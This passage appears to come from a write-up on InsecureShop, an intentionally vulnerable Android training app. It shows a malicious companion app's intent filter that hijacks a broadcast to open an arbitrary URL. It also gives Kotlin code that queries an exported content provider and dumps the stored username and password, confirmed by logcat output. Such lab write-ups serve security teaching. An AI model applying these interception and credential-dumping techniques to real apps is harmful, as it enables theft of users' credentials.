+    <action android:name="com.insecureshop.action.PRODUCT_DETAIL" />
+</intent-filter>
+
+
+
+Copy
+
+There are two things to notice in this, the first being the android priority. which basically states that our MainActivity has priority in handling the broadcasted intent. The second this is the action, as it should be the exact same as the broadcasted intent.
+One thing to keep in mind is that our attacking application needs to be running in order for this interception to succeed. Otherwise the application will work like it should. The next short video shows that when we click on the "More Info" button initially then indeed the InsecureShop gets us to the correct page. Though, once the attacking app is started and then we click again on the "More Info" then the arbitrary URL we have defined is opening up.
+
+
+
+
+Insecure Content Provider
+One of the first things noticed in the AndroidManifest file of InsecureShop was the exported content provider:
+<provider
+    android:name=".contentProvider.InsecureShopProvider"
+    android:authorities="com.insecureshop.provider"
+    android:exported="true"
+    android:readPermission="com.insecureshop.permission.READ" />
+
+
+
+
+
+Copy
+ Besides the fact that is exported, the other two things we take from this snippet is the name and the permission it requires.
+In the file InsecureShopProvider.kt we see the following:
+if (uriMatcher?.match(uri) == URI_CODE) {
+    val cursor = MatrixCursor(arrayOf("username", "password"))
+    cursor.addRow(arrayOf<String>(Prefs.username!!, Prefs.password!!))
+    return cursor
+}
+
+
+
+
+
+Copy
+
+And on the onCreate we see the uriMatcher:
+uriMatcher?.addURI("com.insecureshop.provider", "insecure", URI_CODE)
+
+Copy
+
+So, this means that with the proper URI we will be able to access the username and the password of the content provider!
+The solution is relatively simple. Again using the attacking app we have, we utilize the dump function we created above in our MainActivity to dump the contacts from the FileProvider vulnerability and we pass it a proper URI. The following snippet shows this:
+fun insecureContentrovider() {
+    try {
+        val URL = "content://com.insecureshop.provider/insecure"
+        val data = Uri.parse(URL)
+        (activity as MainActivity).dump(data)
+    } catch (ex: Exception) {
+        ex.printStackTrace()
+    }
+}
+
+
+
+
+
+
+
+
+
+Copy
+
+Checking the logcat we see:
+2021-10-16 17:45:41.529 2936-2936/com.erev0s.attackerinsecureshop D/erev0s.com: username = test, password = test
+
+Copy
+ 
+
+
